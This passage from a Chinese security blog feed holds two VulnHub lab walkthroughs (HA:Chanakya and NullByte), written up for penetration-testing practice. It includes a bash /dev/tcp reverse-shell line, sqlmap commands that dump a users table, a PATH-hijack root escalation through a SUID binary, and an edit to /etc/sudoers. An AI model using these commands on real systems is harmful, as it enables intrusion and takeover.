    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#hachanakya靶机渗透">HA:chanakya靶机渗透</a><ul><li><a href="#1-环境和信息">1. 环境和信息</a><ul><li><a href="#11-靶机下载地址">1.1 靶机下载地址</a></li><li><a href="#12-环境">1.2 环境</a></li><li><a href="#13-信息">1.3 信息</a></li></ul></li><li><a href="#2-渗透过程">2. 渗透过程</a><ul><li><a href="#21-信息收集">2.1 信息收集</a></li><li><a href="#22-开始渗透">2.2 开始渗透</a></li></ul></li><li><a href="#3-重要信息">3. 重要信息</a><ul><li><a href="#31-ftp账号密码">3.1 FTP账号密码</a></li></ul></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="hachanakya靶机渗透">HA:chanakya靶机渗透</span></h1><h2><span id="1-环境和信息">1. 环境和信息</span></h2><h3><span id="11-靶机下载地址">1.1 靶机下载地址</span></h3><ul><li><a href="https://download.vulnhub.com/ha/chanakya.zip" target="_blank" rel="noopener">点击下载[chanakya.zip]</a></li></ul><h3><span id="12-环境">1.2 环境</span></h3><ul><li>攻击环境：<strong><em>kali linux</em></strong>  IP地址：<strong><em>192.168.0.21</em></strong></li><li>靶机环境：<strong><em>linux</em></strong> IP地址：<strong><em>待扫描</em></strong></li></ul><h3><span id="13-信息">1.3 信息</span></h3><blockquote><p>摧毁王国的策划者又回来了，这次他创造了一个难题，会让你挠头！是时候面对Chanakya。<br>您是否能够解决此“从根开始”并证明自己更明智？<br>枚举是关键！！！！</p></blockquote><h2><span id="2-渗透过程">2. 渗透过程</span></h2><h3><span id="21-信息收集">2.1 信息收集</span></h3><ul><li>脚本化扫描 【只是简单的将 IP发现、端口扫描、nikto扫描、whatweb 生成一个报表】</li><li><img data-src="../images/mdImages/image-20200519213259360.png" alt="image-20200519213259360"></li><li>扫描结束，我们可以获得靶机IP地址为： <strong><em>192.168.0.107</em></strong></li><li>扫描结果在 <em>Auto-Scan/192.168.0.107.html</em></li><li>打开看看：</li><li><img data-src="../images/mdImages/image-20200519213632003.png" alt="image-20200519213632003"></li><li>可以看到开启的服务有 <strong>(21)ftp  (22)ssh 和80(http)</strong></li><li>nikto扫描的web并没有可用的信息，whatweb也没扫描出任何web框架</li><li>简单浏览一下网页</li><li><img data-src="../images/mdImages/image-20200519214049252.png" alt="image-20200519214049252"></li><li>也没看到啥玩意啊</li><li>开始尝试目录爆破</li><li><img data-src="../images/mdImages/image-20200519215514033.png" alt="image-20200519215514033"></li><li>得到关键文件：<strong><em>abuse.txt</em></strong></li><li>打开内容是：<strong><em>nfubxn.cpncat</em></strong>  不管先保存一下</li></ul><h3><span id="22-开始渗透">2.2 开始渗透</span></h3><ul><li><p>我们先尝试登陆ftp看看</p></li><li><p><img data-src="../images/mdImages/image-20200519215923243.png" alt="image-20200519215923243"></p></li><li><p>需要用户名密码，试试这个<strong><em>nfubxn.cpncat</em></strong></p></li><li><p>登不上去，难道是加密了，还是另藏玄机</p></li><li><p>如果是加密很可能是凯撒密码，就是每个字母都会偏移某个特定的值</p></li><li><p>但是  像 “ <strong>.</strong> “ 这种字符是不会被加密的而且只支持26个字母</p></li><li><p>到网上解密一下</p></li><li><p><img data-src="../images/mdImages/image-20200519221021938.png" alt="image-20200519221021938"></p></li><li><p>可以用脚本把 1-25 的全部结果都拿出来看看</p></li><li><p>我这里直接公布答案了</p></li><li><p><img data-src="../images/mdImages/image-20200519221229352.png" alt="image-20200519221229352"></p></li><li><p>当key=13时，密文就变成了<strong><em>ashoka.pcapng</em></strong>  </p></li><li><p>用过<em>Wireshark</em> 的都知道 <em>pcapng</em>是新版本数据包的后缀名，刚好有点在前面，这就好像是一个文件</p></li><li><p>我们试着访问 <a href="http://192.168.0.107/ashoka.pcapng" target="_blank" rel="noopener">http://192.168.0.107/ashoka.pcapng</a></p></li><li><p>能下载~看来是要我们分析流量</p></li><li><p>可以看到有FTP协议的流量，我们追踪流</p></li><li><p><img data-src="../images/mdImages/image-20200519221857035.png" alt="image-20200519221857035"></p></li><li><p>可以看到登录时输入的账号和密码还有一些操作</p></li><li><p>FTP账号密码：<strong><em>ashoka : kautilya</em></strong></p></li><li><p><img data-src="../images/mdImages/image-20200519222454291.png" alt="image-20200519222454291"></p></li><li><p>登录之后是在<strong>ashoka</strong>的用户目录下， 也没看到什么有价值的文件</p></li><li><p>反正他有ssh服务，我们尝试使用公钥达到免密码登录</p></li><li><p>先到kaii机器生成自己的密钥对</p></li><li><p><img data-src="../images/mdImages/image-20200519222912589.png" alt="image-20200519222912589"></p></li><li><p>在<em>~/.ssh</em> 文件夹里面的 <em>.pub</em>文件 复制成一份名叫 <strong><em>authorized_keys</em></strong>的文件</p></li><li><p>随便用什么连接一下FTP然后把这个文件传到FTP下的<strong><em>.ssh/authorized_keys</em></strong></p></li><li><p>就可以免密码登录了</p></li><li><p><img data-src="../images/mdImages/image-20200519224818556.png" alt="image-20200519224818556"></p></li><li><p>登录之后就可以想办法提权了</p></li><li><p>我们直接找suid的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -<span class="built_in">type</span> f -perm 777 -<span class="built_in">exec</span> ls -l &#123;&#125; \; 2&gt;/dev/null <span class="comment"># 查找777的文件</span></span><br></pre></td></tr></table></figure></li><li><p><img data-src="../images/mdImages/image-20200519225239807.png" alt="image-20200519225239807"></p></li><li><p>没有找到可利用的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">uname -a </span><br><span class="line">Linux ubuntu 4.15.0-20-generic <span class="comment">#21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">cat /etc/*release </span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=18.04</span><br><span class="line">DISTRIB_CODENAME=bionic</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">"Ubuntu 18.04 LTS"</span></span><br><span class="line">NAME=<span class="string">"Ubuntu"</span></span><br><span class="line">VERSION=<span class="string">"18.04 LTS (Bionic Beaver)"</span></span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=<span class="string">"Ubuntu 18.04 LTS"</span></span><br><span class="line">VERSION_ID=<span class="string">"18.04"</span></span><br><span class="line">HOME_URL=<span class="string">"https://www.ubuntu.com/"</span></span><br><span class="line">SUPPORT_URL=<span class="string">"https://help.ubuntu.com/"</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">"https://bugs.launchpad.net/ubuntu/"</span></span><br><span class="line">PRIVACY_POLICY_URL=<span class="string">"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</span></span><br><span class="line">VERSION_CODENAME=bionic</span><br><span class="line">UBUNTU_CODENAME=bionic</span><br><span class="line"><span class="built_in">history</span>  <span class="comment">#无</span></span><br><span class="line">crontab -l  <span class="comment">#无</span></span><br><span class="line">sudo -l <span class="comment">#没密码</span></span><br><span class="line">ls -al /tmp <span class="comment">#找到一个logs文件</span></span><br><span class="line">logs</span><br></pre></td></tr></table></figure></li><li><p>打开看了一下，随便找了一条百度了一下</p></li><li><p>说是 <em>linux系统入侵检测工具chkrootkit</em> 的日志文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find / -name chkrootkit  2&gt;/dev/null <span class="comment">#查找chkrootkit文件的位置</span></span><br><span class="line">/usr/<span class="built_in">local</span>/share/chkrootkit</span><br><span class="line">/usr/<span class="built_in">local</span>/share/chkrootkit/chkrootkit</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/share/chkrootkit  <span class="comment">#切换进chkrootkit目录</span></span><br><span class="line">./chkrootkit --<span class="built_in">help</span> <span class="comment">#说是-V查看版本</span></span><br><span class="line">./chkrootkit -V</span><br><span class="line">chkrootkit version 0.49</span><br></pre></td></tr></table></figure></li><li><p>kali 里面再搜下<strong><em>chkrootkit</em></strong>的漏洞</p></li><li><p><img data-src="../images/mdImages/image-20200519230813298.png" alt="image-20200519230813298"></p></li><li><p>刚好版本相同</p></li><li><p>这里用的是<strong><em>33899.txt</em></strong></p><blockquote><p>The line ‘file_port=$file_port $i’ will execute all files specified in<br>$SLAPPER_FILES as the user chkrootkit is running (usually root), if<br>$file_port is empty, because of missing quotation marks around the<br>variable assignment.</p><p>Steps to reproduce:</p><ul><li>Put an executable file named ‘update’ with non-root owner in /tmp (not<br>mounted noexec, obviously)</li><li>Run chkrootkit (as uid 0)</li></ul><p>Result: The file /tmp/update will be executed as root, thus effectively<br>rooting your box, if malicious content is placed inside the file.</p><p>If an attacker knows you are periodically running chkrootkit (like in<br>cron.daily) and has write access to /tmp (not mounted noexec), he may<br>easily take advantage of this.</p><p>Suggested fix: Put quotation marks around the assignment.</p><p>file_port=”$file_port $i”</p><p>I will also try to contact upstream, although the latest version of<br>chkrootkit dates back to 2009 - will have to see, if I reach a dev there</p></blockquote></li><li><p>大概意思就是说<strong><em>chkrootkit</em></strong> 一般会设置成计划运行,在运行时会调用<strong><em>/tmp/update</em></strong>文件</p></li><li><p>然后我就写了一个反弹shell的文件,保存在<strong><em>/tmp/update</em></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.21/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><p>kali 用nc监听一下8888端口,等一会就会反弹一个shell了</p></li><li><p><img data-src="../images/mdImages/image-20200519233832895.png" alt="image-20200519233832895"></p></li><li><p>看了下计划任务</p></li><li><p><img data-src="../images/mdImages/image-20200519234002162.png" alt="image-20200519233832895"></p></li><li><p>一分钟就会执行一次<strong><em>chkrootkit</em></strong> </p></li><li><p>到这里就结束了</p></li></ul><h2><span id="3-重要信息">3. 重要信息</span></h2><h3><span id="31-ftp账号密码">3.1 FTP账号密码</span></h3><p>​    <strong><em>ashoka : kautilya</em></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#hachanakya靶机渗透&quot;&gt;HA:chanakya靶机渗透&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-环境和信息&quot;&gt;1. 环境和信息&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-靶机下载地址&quot;&gt;1.1 靶机下载地址&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#12-环境&quot;&gt;1.2 环境&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#13-信息&quot;&gt;1.3 信息&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-渗透过程&quot;&gt;2. 渗透过程&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#21-信息收集&quot;&gt;2.1 信息收集&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#22-开始渗透&quot;&gt;2.2 开始渗透&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-重要信息&quot;&gt;3. 重要信息&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#31-ftp账号密码&quot;&gt;3.1 FTP账号密码&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://atc96.top/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>nullbyte</title>
    <link href="https://atc96.top/nullbyte/"/>
    <id>https://atc96.top/nullbyte/</id>
    <published>2020-05-12T05:03:47.000Z</published>
    <updated>2020-05-12T08:58:05.575Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#nullbyte-靶机渗透">NullByte 靶机渗透</a><ul><li><a href="#0x01-环境信息">0x01 环境信息：</a></li><li><a href="#0x02-渗透过程">0x02 渗透过程：</a></li><li><a href="#0x03-the_end">0x03 THE_END</a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="nullbyte-靶机渗透">NullByte 靶机渗透</span></h1><h2><span id="0x01-环境信息">0x01 环境信息：</span></h2><ol><li><p>攻击机：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system: kali linux Ipaddress: <span class="number">192.168</span><span class="number">.0</span><span class="number">.21</span></span><br></pre></td></tr></table></figure></li><li><p>靶机：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system: 未知 Ipaddress: 未知（局域网内）</span><br></pre></td></tr></table></figure></li></ol><h2><span id="0x02-渗透过程">0x02 渗透过程：</span></h2><ul><li>主机发现</li><li>使用初期扫描脚本扫描：</li><li>扫描结果</li></ul><p><img data-src="../images/mdImages/image-20200512134810766.png" alt="image-20200512134810766"></p><ul><li><p>可以得到：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iPaddress: <span class="number">192.168</span><span class="number">.0</span><span class="number">.113</span></span><br><span class="line">http: <span class="number">80</span>  /phpmyadmin</span><br><span class="line">rpcbind: <span class="number">111</span></span><br><span class="line">ssh: <span class="number">777</span></span><br><span class="line">system: Debian Linux</span><br></pre></td></tr></table></figure></li><li><p>先去看看web</p></li><li><p><a href="http://192.168.0.113" target="_blank" rel="noopener">http://192.168.0.113</a></p><p><img data-src="../images/mdImages/image-20200512135615706.png" alt="image-20200512135615706"></p></li><li><p>只有这么些东西，当然还有一个 <code>phpmyadmin</code> 也咩有密码啊</p></li><li><p>然后看看这个图片是不是有隐写</p></li><li><p>下载到kali里面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# exiftool main.gif</span><br><span class="line">ExifTool Version <span class="built_in">Number</span>         : <span class="number">11.98</span></span><br><span class="line">File Name                       : main.gif</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : <span class="number">16</span> kB</span><br><span class="line">File Modification <span class="built_in">Date</span>/Time     : <span class="number">2020</span>:<span class="number">05</span>:<span class="number">12</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">45</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Access <span class="built_in">Date</span>/Time           : <span class="number">2020</span>:<span class="number">05</span>:<span class="number">12</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">45</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Inode Change <span class="built_in">Date</span>/Time     : <span class="number">2020</span>:<span class="number">05</span>:<span class="number">12</span> <span class="number">14</span>:<span class="number">35</span>:<span class="number">22</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : GIF</span><br><span class="line">File Type Extension             : gif</span><br><span class="line">MIME Type                       : image/gif</span><br><span class="line">GIF Version                     : <span class="number">89</span>a</span><br><span class="line">Image Width                     : <span class="number">235</span></span><br><span class="line">Image Height                    : <span class="number">302</span></span><br><span class="line">Has Color <span class="built_in">Map</span>                   : No</span><br><span class="line">Color Resolution Depth          : <span class="number">8</span></span><br><span class="line">Bits Per Pixel                  : <span class="number">1</span></span><br><span class="line">Background Color                : <span class="number">0</span></span><br><span class="line">Comment                         : P-): kzMb5nVYJw</span><br><span class="line">Image Size                      : <span class="number">235</span>x302</span><br><span class="line">Megapixels                      : <span class="number">0.071</span></span><br></pre></td></tr></table></figure></li><li><p>可以看到 <code>Comment        : P-): kzMb5nVYJw</code></p></li><li><p><code>kzMb5nVYJw</code> 好像是密码?还是什么</p></li><li><p>试了一下<code>phpmyadmin</code>的密码没用啊</p></li><li><p>然后我又爆破了一下目录</p></li><li><p><img data-src="../images/mdImages/image-20200512145546435.png" alt="image-20200512145546435"></p></li><li><p>没啥有用的信息啊</p></li><li><p>看看是不是这个目录</p></li><li><p><a href="http://192.168.0.113/kzMb5nVYJw" target="_blank" rel="noopener">http://192.168.0.113/kzMb5nVYJw</a></p></li><li><p>果然有，要我们输入key</p></li><li><p>试试SQL注入</p></li><li><p>先抓包</p></li><li><p><img data-src="../images/mdImages/image-20200512150308115.png" alt="image-20200512150308115"></p></li><li><p>再复制<code>copy to file</code> 保存为<code>sqlmap.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqlmap.txt</span><br></pre></td></tr></table></figure></li><li><p>不存在SQL注入</p></li><li><p>那只能尝试爆破了</p></li><li><p><img data-src="../images/mdImages/image-20200512151542526.png" alt="image-20200512151542526"></p></li><li><p><img data-src="../images/mdImages/image-20200512151429648.png" alt="image-20200512151429648"></p></li><li><p>跑出来key是：<code>elite</code></p></li><li><p><img data-src="../images/mdImages/image-20200512151707333.png" alt="image-20200512151707333"></p></li><li><p>就看到搜索username的</p></li><li><p>再试试有没有sql注入</p></li><li><p>可以先用fuzz测试一下</p></li><li><p>抓个包</p></li><li><p><img data-src="../images/mdImages/image-20200512151959806.png" alt="image-20200512151959806"></p></li><li><p>然后<code>send to Intruder</code></p></li><li><p><img data-src="../images/mdImages/image-20200512152110694.png" alt="image-20200512152110694"></p></li><li><p>payload选<code>Fuzzing-SQL Injection</code>就可以</p></li><li><p>可以看到有些 会报sql语句的错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Could not get data: You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span>%;)(&amp;+%"' at line 1</span><br></pre></td></tr></table></figure></li><li><p>然后就可以使用sqlmap跑了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch=1 --dbs</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br><span class="line">[*] seth</span><br><span class="line">sqlmap -u http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch=1 --current-db</span><br><span class="line">current database:    <span class="string">'seth'</span></span><br><span class="line">sqlmap -u http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch=1 -D seth --tables</span><br><span class="line">Database: seth</span><br><span class="line">[1 table]</span><br><span class="line">+-------+</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br><span class="line">sqlmap -u http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch=1 -D seth -T users --columns</span><br><span class="line">Table: users</span><br><span class="line">[4 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| position | text        |</span><br><span class="line">| user     | text        |</span><br><span class="line">| id       | smallint(6) |</span><br><span class="line">| pass     | text        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">sqlmap -u http://192.168.0.113/kzMb5nVYJw/420search.php?usrtosearch=1 -D seth -T users -C user,pass --dump</span><br><span class="line">Database: seth</span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+--------+---------------------------------------------+</span><br><span class="line">| user   | pass                                        |</span><br><span class="line">+--------+---------------------------------------------+</span><br><span class="line">| ramses | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |</span><br><span class="line">| isis   | --not allowed--                             |</span><br><span class="line">+--------+---------------------------------------------+</span><br></pre></td></tr></table></figure></li><li><p>可以知道一个账号密码</p></li><li><p>是不是ssh的账号密码呢？</p></li><li><p>先把密码破解出来</p></li><li><p>好像是一串base64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/workspace<span class="comment"># echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE" &gt; b64</span></span><br><span class="line">root@kali:~/workspace<span class="comment"># base64 -d b64</span></span><br><span class="line">c6d6bd7ebf806f43c76acc3681703b81 base64: 输入无效</span><br></pre></td></tr></table></figure></li><li><p>得到一串MD5 <code>c6d6bd7ebf806f43c76acc3681703b81</code></p></li><li><p>可以用john解密也可以到网上找</p></li><li><p>我用了下john没跑出来，用在线工具一下就出来了</p></li><li><p><img data-src="../images/mdImages/image-20200512154211755.png" alt="image-20200512154211755"></p></li><li><p>得到账号密码是：<code>ramses: omega</code></p></li><li><p>去试试ssh吧，记得端口是777</p></li><li><p><img data-src="../images/mdImages/image-20200512160325001.png" alt="image-20200512160325001"></p></li><li><p>就上了ssh了</p></li><li><p>想办法提权了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先试试这这几个</span></span><br><span class="line">sudo -l <span class="comment">#（无）</span></span><br><span class="line">crontab -l<span class="comment">#（无）</span></span><br><span class="line"><span class="built_in">history</span><span class="comment">#（无可用的）</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/var/www/backup/procwatch</span><br></pre></td></tr></table></figure></li><li><p>找到 <code>/var/www/backup/procwatch</code>文件为suid权限，先运行一下看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line"> 1451 pts/0    00:00:00 procwatch</span><br><span class="line"> 1452 pts/0    00:00:00 sh</span><br><span class="line"> 1453 pts/0    00:00:00 ps</span><br><span class="line"> ramses@NullByte:/var/www/backup$ ps</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line"> 1361 pts/0    00:00:00 bash</span><br><span class="line"> 1454 pts/0    00:00:00 ps</span><br></pre></td></tr></table></figure></li><li><p>好像就执行了一个ps</p></li><li><p>我们可以试试偷天换日</p></li><li><p>先伪造一个ps命令，并让他找到这个ps</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪造ps命令：</span></span><br><span class="line">echo <span class="string">'/bin/sh'</span> &gt; ps</span><br><span class="line">chmod +x ps</span><br><span class="line"><span class="comment">// 使procwatch找到这个ps:</span></span><br><span class="line"><span class="comment">// 先看看环境变量</span></span><br><span class="line">ramses@NullByte:<span class="regexp">/var/</span>www/backup$ echo $PATH</span><br><span class="line">/usr/local/bin:<span class="regexp">/usr/</span>bin:<span class="regexp">/bin:/u</span>sr/local/games:<span class="regexp">/usr/g</span>ames</span><br><span class="line"><span class="comment">// 把当前文件夹的放到当前位置去，他就会先找当前目录下ps</span></span><br><span class="line">ramses@NullByte:<span class="regexp">/var/</span>www/backup$ <span class="keyword">export</span> PATH=.:$PATH</span><br><span class="line">ramses@NullByte:<span class="regexp">/var/</span>www/backup$ echo $PATH</span><br><span class="line">.:<span class="regexp">/usr/</span>local/bin:<span class="regexp">/usr/</span>bin:<span class="regexp">/bin:/u</span>sr/local/games:<span class="regexp">/usr/g</span>ames</span><br><span class="line"><span class="comment">// 执行procwatch</span></span><br><span class="line">ramses@NullByte:<span class="regexp">/var/</span>www/backup$ ./procwatch</span><br><span class="line"># cd /root</span><br><span class="line"><span class="comment">//说明已经是root权限了</span></span><br><span class="line"># ls</span><br><span class="line">proof.txt</span><br><span class="line"><span class="comment">// 可以直接给ramses root权限</span></span><br><span class="line">echo <span class="string">'ramsesALL=(ALL:ALL) ALL'</span> &gt;&gt; <span class="regexp">/etc/</span>sudoers</span><br><span class="line">exit</span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure></li><li><p>就拿到了flag了~</p></li><li><p><img data-src="../images/mdImages/image-20200512164547103.png" alt="image-20200512164547103"></p></li><li><p>看到第一条有个hash值，解密就是<code>welldone22</code></p></li></ul><p><img data-src="../images/mdImages/image-20200512162730802.png" alt="image-20200512162730802"></p><h2><span id="0x03-the_end">0x03 THE_END</span></h2><hr>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#nullbyte-靶机渗透&quot;&gt;NullByte 靶机渗透&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-环境信息&quot;&gt;0x01 环境信息：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-渗透过程&quot;&gt;0x02 渗透过程：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x03-the_end&quot;&gt;0x03 THE_END&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://atc96.top/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Docker-Config</title>
    <link href="https://atc96.top/Docker-Config/"/>
    <id>https://atc96.top/Docker-Config/</id>
    <published>2020-05-10T15:06:36.000Z</published>
    <updated>2020-05-10T15:30:23.932Z</updated>
    
